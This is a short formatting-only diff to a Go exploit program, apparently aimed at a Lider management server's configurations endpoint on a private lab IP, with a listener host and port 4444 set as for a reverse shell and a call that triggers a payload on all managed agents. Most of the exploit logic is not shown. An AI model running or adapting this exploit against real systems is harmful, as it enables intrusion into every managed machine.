@@ -10,7 +10,7 @@ import (
 
 var TARGET, LHOST, LPORT string
 
-func main(){
+func main() {
 
 	print_info("Starting the exploit")
 
@@ -19,7 +19,7 @@ func main(){
 	LHOST = "172.26.64.120"
 	LPORT = "4444"
 
-	TARGETURI :=  "http://192.168.179.134:8080/lider/config/configurations"
+	TARGETURI := "http://192.168.179.134:8080/lider/config/configurations"
 
 	res, err := http.Get(TARGETURI)
 
@@ -72,6 +72,5 @@ func main(){
 
 	cu.TriggerPayloadonAllAgents(agents)
 	//fmt.Println(NewPayload())
-
 
 }
